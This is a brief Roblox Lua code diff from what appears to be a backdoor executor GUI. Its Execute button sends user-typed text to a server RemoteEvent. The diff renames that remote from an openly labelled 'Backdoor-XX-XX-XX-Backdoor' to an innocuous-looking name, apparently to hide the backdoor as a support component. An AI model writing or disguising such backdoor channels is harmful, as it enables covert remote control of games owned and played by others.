@@ -70,7 +70,7 @@ UICorner2.Parent = Execute
 local UIStroke2 = Instance.new("UIStroke")
 UIStroke2.Parent = Execute
 Execute.MouseButton1Click:Connect(function()
-game:GetService("ReplicatedStorage"):WaitForChild("Backdoor-XX-XX-XX-Backdoor"):FireServer(Input.Text)
+game:GetService("ReplicatedStorage"):WaitForChild("RobloxStudioRobloxPlayerSupportGamexxxrexxx"):FireServer(Input.Text)
 end)
 local RemoteEvent = Instance.new("RemoteEvent")
 RemoteEvent.Parent = Execute
